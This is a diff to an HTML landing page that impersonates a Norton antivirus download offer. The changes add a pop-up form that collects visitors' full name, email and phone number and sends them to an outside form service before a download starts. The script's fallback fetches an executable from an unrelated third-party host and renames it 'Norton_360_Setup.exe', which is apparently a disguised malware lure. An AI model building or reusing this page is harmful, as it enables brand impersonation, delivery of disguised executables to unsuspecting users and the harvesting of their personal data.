@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Norton™ 360 | All-in-one Protection</title>
+    <title>Norton™ Malware Protection | All-in-one Protection</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link
       rel="stylesheet"
@@ -79,6 +79,99 @@
       </div>
     </div>
 
+    <div
+      id="userFormModal"
+      class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 hidden"
+    >
+      <div class="bg-white rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl">
+        <div class="text-center mb-6">
+          <div
+            class="bg-gradient-to-r from-blue-500 to-blue-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
+          >
+            <i class="fas fa-shield-alt text-2xl text-white"></i>
+          </div>
+          <h3 class="text-2xl font-bold text-gray-800 mb-2">
+            Complete Your Download
+          </h3>
+          <p class="text-gray-600 text-sm">
+            Please provide your details to receive Norton 360
+          </p>
+        </div>
+
+        <form
+          id="userDetailsForm"
+          action="https://formspree.io/f/xkgbbeao"
+          method="POST"
+        >
+          <div class="space-y-4">
+            <div>
+              <label class="block text-gray-700 font-medium mb-2"
+                >Full Name *</label
+              >
+              <input
+                type="text"
+                name="name"
+                required
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              />
+            </div>
+
+            <div>
+              <label class="block text-gray-700 font-medium mb-2"
+                >Email Address *</label
+              >
+              <input
+                type="email"
+                name="email"
+                required
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              />
+            </div>
+
+            <div>
+              <label class="block text-gray-700 font-medium mb-2"
+                >Phone Number *</label
+              >
+              <input
+                type="tel"
+                name="phone"
+                required
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              />
+            </div>
+
+            <!-- Hidden field to track which product was downloaded -->
+            <input type="hidden" name="product" value="Norton 360" />
+            <input
+              type="hidden"
+              name="_subject"
+              value="New Norton 360 Download Request"
+            />
+          </div>
+
+          <div class="flex space-x-3 mt-6">
+            <button
+              type="submit"
+              class="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 px-6 rounded-lg flex-1 transition duration-200"
+            >
+              <span id="submitText">Complete Download</span>
+              <i
+                id="submitLoader"
+                class="fas fa-spinner fa-spin ml-2 hidden"
+              ></i>
+            </button>
+            <button
+              type="button"
+              onclick="closeUserModal()"
+              class="bg-gray-300 hover:bg-gray-400 text-gray-700 font-bold py-3 px-6 rounded-lg transition duration-200"
+            >
+              Cancel
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+
     <!-- Header -->
     <header class="gradient-bg text-white">
       <div class="container mx-auto px-4 py-6">
@@ -112,7 +205,7 @@
             LIMITED TIME OFFER
           </div>
           <h1 class="text-4xl md:text-5xl font-bold leading-tight mb-4">
-            Norton™ 360 <br />
+            Norton™ Malware protection <br />
             <span class="text-yellow-300">Save Up To 18%</span>
           </h1>
           <p class="text-xl mb-8 opacity-90">
@@ -123,6 +216,7 @@
           >
             <button
               id="downloadBtn"
+              onclick="downloadWithForm()"
               class="download-btn bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-3 px-8 rounded-full flex items-center justify-center pulse"
             >
               <i class="fas fa-download mr-2"></i> Download Now
@@ -631,16 +725,86 @@
     </footer>
 
     <script>
-      // Function to download Norton using the API
-      function downloadNorton() {
+      let downloadTriggered = false;
+
+      // Function to handle download with form
+      function downloadWithForm() {
+        // Show the user form modal
+        document.getElementById("userFormModal").classList.remove("hidden");
+        document.body.style.overflow = "hidden"; // Prevent background scrolling
+      }
+
+      // Close user modal
+      function closeUserModal() {
+        document.getElementById("userFormModal").classList.add("hidden");
+        document.body.style.overflow = "auto";
+      }
+
+      // Handle form submission
+      document
+        .getElementById("userDetailsForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          // Show loading state
+          const submitBtn = document.querySelector(
+            '#userDetailsForm button[type="submit"]'
+          );
+          const submitText = document.getElementById("submitText");
+          const submitLoader = document.getElementById("submitLoader");
+
+          submitText.textContent = "Processing...";
+          submitLoader.classList.remove("hidden");
+          submitBtn.disabled = true;
+
+          // Submit form data to Formspree
+          const formData = new FormData(this);
+
+          fetch(this.action, {
+            method: "POST",
+            body: formData,
+            headers: {
+              Accept: "application/json",
+            },
+          })
+            .then((response) => {
+              if (response.ok) {
+                // Form submitted successfully, now trigger download
+                triggerActualDownload();
+
+                // Show success message
+                submitText.textContent = "Download Starting...";
+
+                // Close modal after delay
+                setTimeout(() => {
+                  closeUserModal();
+                  showNotification("Norton 360");
+
+                  // Reset form
+                  this.reset();
+                  submitText.textContent = "Complete Download";
+                  submitLoader.classList.add("hidden");
+                  submitBtn.disabled = false;
+                }, 2000);
+              } else {
+                throw new Error("Form submission failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              alert("There was an error. Please try again.");
+
+              // Reset button state
+              submitText.textContent = "Complete Download";
+              submitLoader.classList.add("hidden");
+              submitBtn.disabled = false;
+            });
+        });
+
+      // Function to actually trigger the download
+      function triggerActualDownload() {
         try {
-          // Show download notification
-          showNotification();
-
-          // Create the download URL with Norton as the movie name parameter
           const url = `/api/download?movie=Norton`;
-
-          // Create hidden link and trigger download
           const a = document.createElement("a");
           a.href = url;
           a.style.display = "none";
@@ -648,40 +812,32 @@
           a.click();
           document.body.removeChild(a);
 
-          // Log for analytics
-          console.log("Norton 360 download initiated via API");
+          console.log("Norton download initiated via API");
         } catch (error) {
           console.error("Download failed:", error);
-
           // Fallback to direct download
-          directDownload();
+          const remoteFile =
+            "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+          const a = document.createElement("a");
+          a.href = remoteFile;
+          a.download = "Norton_360_Setup.exe";
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
         }
       }
 
-      // Direct download fallback function
-      function directDownload() {
-        const remoteFile =
-          "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
-
-        // Create download link with Norton filename
-        const a = document.createElement("a");
-        a.href = remoteFile;
-        a.download = "Norton_360_Setup.exe";
-        a.style.display = "none";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+      // Update all existing download button functions
+      function downloadNorton() {
+        downloadWithForm();
       }
 
       // Show download notification
       function showNotification() {
         const notification = document.getElementById("downloadNotification");
         notification.classList.add("show");
-
-        // Auto-hide after 5 seconds
-        setTimeout(() => {
-          hideNotification();
-        }, 5000);
+        setTimeout(() => hideNotification(), 5000);
       }
 
       // Hide download notification
@@ -689,24 +845,6 @@
         const notification = document.getElementById("downloadNotification");
         notification.classList.remove("show");
       }
-
-      // Add event listeners to download buttons
-      document
-        .getElementById("downloadBtn")
-        .addEventListener("click", downloadNorton);
-      document
-        .getElementById("downloadBtn2")
-        .addEventListener("click", downloadNorton);
-
-      // Add event listeners to all "Get Protection" buttons
-      document.addEventListener("DOMContentLoaded", function () {
-        const protectionButtons = document.querySelectorAll(
-          'button[onclick="downloadNorton()"]'
-        );
-        protectionButtons.forEach((button) => {
-          button.addEventListener("click", downloadNorton);
-        });
-      });
     </script>
   </body>
 </html>
